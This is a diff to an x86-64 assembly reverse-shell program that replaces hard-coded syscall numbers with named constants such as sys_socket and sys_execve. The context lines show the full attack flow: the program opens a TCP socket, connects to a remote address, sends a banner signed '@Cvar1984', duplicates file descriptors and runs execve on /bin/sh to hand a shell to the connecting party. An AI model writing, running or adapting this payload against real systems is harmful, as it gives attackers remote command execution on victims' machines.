@@ -10,7 +10,13 @@ section .bss
     endstruc
 
 section .rodata
-
+    sys_write equ 0x1
+    sys_socket equ 0x29
+    sys_socket_connect equ 0x2A
+    sys_execve equ 59
+    fd_socket equ 0x3
+    fd_stdout equ 0x1
+ 
     msg db '@Cvar1984'
     msg_len equ $-msg
     msg_bar times 10 db '*'
@@ -36,7 +42,7 @@ _start:
     jmp _socket
 
 _socket:
-    mov rax, 0x29   ; use socket syscall
+    mov rax, sys_socket   ; use socket syscall
     mov rdi, 0x2    ; use AF_INET
     mov rsi, 0x1    ; use SOCK_STREAM
     mov rdx, 0x6    ; use IPPROTO_TCP
@@ -47,7 +53,7 @@ _socket:
     jmp _connect
 
 _error_socket:      ; write error socket
-    mov rax, 0x1    ; use write syscall
+    mov rax, sys_write
     mov rdi, 0x1
     mov rsi, error  
     mov rdx, error_len
@@ -56,7 +62,7 @@ _error_socket:      ; write error socket
     jmp _exit
 
 _connect:
-    mov rax, 0x2A   ; use connect syscall
+    mov rax, sys_socket_connect
     mov rdi, 0x3    ; put file descriptor in rdi
     mov rsi, _struct_socket     ; put structure socket in rsi
     mov rdx, 0x10   ; put len in rdx
@@ -67,8 +73,8 @@ _connect:
     jmp _write      ; else write
 
 _error_connect:     ; write error connection
-    mov rax, 0x1    ; use write syscall
-    mov rdi, 0x1    ; fd terminal
+    mov rax, sys_write
+    mov rdi, fd_stdout
     mov rsi, error2
     mov rdx, error2_len
     syscall
@@ -76,20 +82,20 @@ _error_connect:     ; write error connection
     jmp _exit
 
 _write:             ; Welcome Message
-    mov rax, 0x1    ; use write syscall
-    mov rdi, 0x3    ; fd socket
+    mov rax, sys_write
+    mov rdi, fd_socket
     mov rsi, msg_bar
     mov rdx, msg_bar_len
     syscall
 
-    mov rax, 0x1    ; use write syscall
-    mov rdi, 0x3    ; fd socket
+    mov rax, sys_write
+    mov rdi, fd_socket
     mov rsi, msg
     mov rdx, msg_len
     syscall
 
-    mov rax, 0x1    ; use write syscall
-    mov rdi, 0x3    ; fd socket
+    mov rax, sys_write
+    mov rdi, fd_socket
     mov rsi, msg_bar
     mov rdx, msg_bar_len
     syscall
@@ -118,7 +124,7 @@ _dupfiledescriptor:     ; duplicate file descriptor
     jmp _shell_spawn
 
 _shell_spawn:                   ; shell spawning
-    mov rax, 59                 ; use execve syscall
+    mov rax, sys_execve
     mov rdi, shell_bin_sh       ; /bin/sh
     xor rsi, rsi                ; Null  
     xor rdx, rdx                ; Null
